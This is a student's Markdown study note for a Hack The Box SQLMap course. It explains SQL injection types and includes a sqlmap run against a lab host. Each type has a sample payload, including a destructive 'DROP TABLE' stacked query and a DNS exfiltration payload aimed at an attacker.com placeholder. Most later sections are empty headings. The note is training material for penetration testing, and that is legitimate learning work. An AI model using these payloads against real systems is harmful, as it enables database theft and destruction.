---
tags:
  - HTB
link: https://academy.hackthebox.com/app/module/58
description: The SQLMap Essentials module will teach you the basics of using SQLMap to discover various types of SQL Injection vulnerabilities, all the way to the advanced enumeration of databases to retrieve all data of interest.
---
## Summary

Most web applications these days are connected to a database at the backend that stores various types of data the web page needs to display, from user information to front end content.

It is very common for such web applications to improperly implement calls to the database, making it possible for an attacker to manipulate the HTTP requests sent to the server to trick the database into showing more data than the developers intended. This type of attack is called a SQL Injection (SQLi).

SQLMap is an automated tool specializing in automating SQL injection discovery and exploitation, making it very trivial for pentesters to discover and exploit SQL injection vulnerabilities.

In the `SQLMap Essentials` module, you will learn the basics of using SQLMap to discover various types of SQL injection vulnerabilities, all the way to advanced database enumeration and retrieval of interesting data.

In this module, we will cover:

- Overview and installation of SQLMap
- Different types of SQL Injection attacks supported by SQLMap, and where to use each
- Understanding the various output of SQLMap, to properly guide your attacks
- Attacking specific parts of a web application with the use of HTTP requests
- Dealing with various types of errors that we may be faced with when using SQLMap
- Using various SQLMap options to tune attacks to our specific needs
- Enumerating full databases and extracting the content of their tables, columns, and rows
- Advanced database enumeration to find specific data
- Finding usernames and passwords within databases and using SQLMap to crack them
- Bypassing various types of protections that may be in place to protect the web application against SQLMap
- Using SQLMap to read and write files to the remote server
- Using SQLMap to execute commands on the remote server and taking complete control over it

| SECTION/TASK | FLAG |
| ------------ | ---- |
|              |      |
|              |      |

<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
</div>
<!-- PAGE BREAK -->
<div style="page-break-after: always;"></div>

## Getting Started

### SQLMap Overview

[SQLMap](https://github.com/sqlmapproject/sqlmap) is a free and open-source penetration testing tool written in Python that automates the process of detecting and exploiting SQL injection (SQLi) flaws. SQLMap has been continuously developed since 2006 and is still maintained today.

```shell
adampueman@htb[/htb]$ python sqlmap.py -u 'http://inlanefreight.htb/page.php?id=5'

       ___
       __H__
 ___ ___[']_____ ___ ___  {1.3.10.41#dev}
|_ -| . [']     | .'| . |
|___|_  ["]_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org


[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting at 12:55:56

[12:55:56] [INFO] testing connection to the target URL
[12:55:57] [INFO] checking if the target is protected by some kind of WAF/IPS/IDS
[12:55:58] [INFO] testing if the target URL content is stable
[12:55:58] [INFO] target URL content is stable
[12:55:58] [INFO] testing if GET parameter 'id' is dynamic
[12:55:58] [INFO] confirming that GET parameter 'id' is dynamic
[12:55:59] [INFO] GET parameter 'id' is dynamic
[12:55:59] [INFO] heuristic (basic) test shows that GET parameter 'id' might be injectable (possible DBMS: 'MySQL')
[12:56:00] [INFO] testing for SQL injection on GET parameter 'id'
<...SNIP...>
```

SQLMap comes with a powerful detection engine, numerous features, and a broad range of options and switches for fine-tuning the many aspects of it, such as:
as:

| Target connection          | Injection detection | Fingerprinting                                         |
| :------------------------- | :------------------ | :----------------------------------------------------- |
| Enumeration                | Optimization        | Protection detection and bypass using "tamper" scripts |
| Database content retrieval | File system access  | Execution of the operating system (OS) commands        |
<div align="center">
<br>
<br>
</div>

#### SQLMap Installation

SQLMap is pre-installed on your Pwnbox, and the majority of security-focused operating systems. SQLMap is also found on many Linux Distributions' libraries. For example, on Debian, it can be installed with:

```shell
adampueman@htb[/htb]$ sudo apt install sqlmap
```

If we want to install manually, we can use the following command in the Linux terminal or the Windows command line:

```shell
`adampueman@htb[/htb]$ git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git sqlmap-dev`
```

After that, SQLMap can be run with:

```shell
`adampueman@htb[/htb]$ python sqlmap.py`
```

<div align="center">
<br>
<br>
</div>

#### Supported Databases

SQLMap has the largest support for DBMSes of any other SQL exploitation tool. SQLMap fully supports the following DBMSes:

|  |  |  |  |
| --- | --- | --- | --- |
| MySQL | Oracle | PostgreSQL | Microsoft SQL Server |
| SQLite | IBM DB2 | Microsoft Access | Firebird |
| Sybase | SAP MaxDB | Informix | MariaDB |
| HSQLDB | CockroachDB | TiDB | MemSQL |
| H2 | MonetDB | Apache Derby | Amazon Redshift |
| Vertica, Mckoi | Presto | Altibase | MimerSQL |
| CrateDB | Greenplum | Drizzle | Apache Ignite |
| Cubrid | InterSystems Cache | IRIS | eXtremeDB |
| FrontBase |  |  |  |

The SQLMap team also works to add and support new DBMSes periodically.
<div align="center">
<br>
<br>
</div>

#### Supported SQL Injection Types

SQLMap is the only penetration testing tool that can properly detect and exploit all known SQLi types. We see the types of SQL injections supported by SQLMap with the `sqlmap -hh` command:

```shell
adampueman@htb[/htb]$ sqlmap -hh
...SNIP...
  Techniques:
    --technique=TECH..  SQL injection techniques to use (default "BEUSTQ")
```

The technique characters `BEUSTQ` refers to the following:

- `B`: Boolean-based blind
- `E`: Error-based
- `U`: Union query-based
- `S`: Stacked queries
- `T`: Time-based blind
- `Q`: Inline queries
<div align="center">
<br>
<br>
</div>

#### Boolean-based blind SQL Injection

Example of `Boolean-based blind SQL Injection`:

```SQL
`AND 1=1`
```

SQLMap exploits `Boolean-based blind SQL Injection` vulnerabilities through the differentiation of `TRUE` from `FALSE` query results, effectively retrieving 1 byte of information per request. The differentiation is based on comparing server responses to determine whether the SQL query returned `TRUE` or `FALSE`. This ranges from fuzzy comparisons of raw response content, HTTP codes, page titles, filtered text, and other factors.

- `TRUE` results are generally based on responses having none or marginal difference to the regular server response.
- `FALSE` results are based on responses having substantial differences from the regular server response.
- `Boolean-based blind SQL Injection` is considered as the most common SQLi type in web applications.
<div align="center">
<br>
<br>
</div>

#### Error-based SQL Injection

Example of `Error-based SQL Injection`:

```SQL
AND GTID_SUBSET(@@version,0)`
```

If the `database management system` (`DBMS`) errors are being returned as part of the server response for any database-related problems, then there is a probability that they can be used to carry the results for requested queries. In such cases, specialized payloads for the current DBMS are used, targeting the functions that cause known misbehaviors. SQLMap has the most comprehensive list of such related payloads and covers `Error-based SQL Injection` for the following DBMSes:

|                      |            |         |
| -------------------- | ---------- | ------- |
| MySQL                | PostgreSQL | Oracle  |
| Microsoft SQL Server | Sybase     | Vertica |
| IBM DB2              | Firebird   | MonetDB |

Error-based SQLi is considered as faster than all other types, except UNION query-based, because it can retrieve a limited amount (e.g., 200 bytes) of data called "chunks" through each request.
<div align="center">
<br>
<br>
</div>

#### UNION query-based

Example of `UNION query-based SQL Injection`:

        SQL
`UNION ALL SELECT 1,@@version,3`

With the usage of `UNION`, it is generally possible to extend the original (`vulnerable`) query with the injected statements' results. This way, if the original query results are rendered as part of the response, the attacker can get additional results from the injected statements within the page response itself. This type of SQL injection is considered the fastest, as, in the ideal scenario, the attacker would be able to pull the content of the whole database table of interest with a single request.

---

## Stacked queries

Example of `Stacked Queries`:

        SQL
`; DROP TABLE users`

Stacking SQL queries, also known as the "piggy-backing," is the form of injecting additional SQL statements after the vulnerable one. In case that there is a requirement for running non-query statements (e.g. `INSERT`, `UPDATE` or `DELETE`), stacking must be supported by the vulnerable platform (e.g., `Microsoft SQL Server` and `PostgreSQL` support it by default). SQLMap can use such vulnerabilities to run non-query statements executed in advanced features (e.g., execution of OS commands) and data retrieval similarly to time-based blind SQLi types.

---

## Time-based blind SQL Injection

Example of `Time-based blind SQL Injection`:

        SQL
`AND 1=IF(2>1,SLEEP(5),0)`

The principle of `Time-based blind SQL Injection` is similar to the `Boolean-based blind SQL Injection`, but here the response time is used as the source for the differentiation between `TRUE` or `FALSE`.

- `TRUE` response is generally characterized by the noticeable difference in the response time compared to the regular server response
- `FALSE` response should result in a response time indistinguishable from regular response times

`Time-based blind SQL Injection` is considerably slower than the boolean-based blind SQLi, since queries resulting in `TRUE` would delay the server response. This SQLi type is used in cases where `Boolean-based blind SQL Injection` is not applicable. For example, in case the vulnerable SQL statement is a non-query (e.g. `INSERT`, `UPDATE` or `DELETE`), executed as part of the auxiliary functionality without any effect to the page rendering process, time-based SQLi is used out of the necessity, as `Boolean-based blind SQL Injection` would not really work in this case.

---

## Inline queries

Example of `Inline Queries`:

        SQL
`SELECT (SELECT @@version) from`

This type of injection embedded a query within the original query. Such SQL injection is uncommon, as it needs the vulnerable web app to be written in a certain way. Still, SQLMap supports this kind of SQLi as well.

---

## Out-of-band SQL Injection

Example of `Out-of-band SQL Injection`:

        SQL
`LOAD_FILE(CONCAT('\\\\',@@version,'.attacker.com\\README.txt'))`

This is considered one of the most advanced types of SQLi, used in cases where all other types are either unsupported by the vulnerable web application or are too slow (e.g., time-based blind SQLi). SQLMap supports out-of-band SQLi through "DNS exfiltration," where requested queries are retrieved through DNS traffic.

By running the SQLMap on the DNS server for the domain under control (e.g. `.attacker.com`), SQLMap can perform the attack by forcing the server to request non-existent subdomains (e.g. `foo.attacker.com`), where `foo` would be the SQL response we want to receive. SQLMap can then collect these erroring DNS requests and collect the `foo` part, to form the entire SQL response.
<div>
<br>
<br>
</div>

#### Questions

##### 
==Answer==
<div align="center">
<br>
<br>
</div>

### Getting Started with SQLMap
<div align="center">
<br>
<br>
</div>

### SQLMap Output Description
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
</div>
<!-- PAGE BREAK -->
<div style="page-break-after: always;"></div>

## Building Attacks

### SQLMap Overview
<div align="center">
<br>
<br>
</div>

### Getting Started with SQLMap
<div align="center">
<br>
<br>
</div>

### SQLMap Output Description
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
</div>
<!-- PAGE BREAK -->
<div style="page-break-after: always;"></div>

## Database Enumeration

### Database Enumeration
<div align="center">
<br>
<br>
</div>

### Advanced Database Enumeration
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
</div>
<!-- PAGE BREAK -->
<div style="page-break-after: always;"></div>

## Advanced SQLMap Usage

### Bypassing Web Application Protections
<div align="center">
<br>
<br>
</div>

### OS Exploitation
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
</div>
<!-- PAGE BREAK -->
<div style="page-break-after: always;"></div>

## Skills Assessment
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
</div>
<!-- PAGE BREAK -->
<div style="page-break-after: always;"></div>

## References

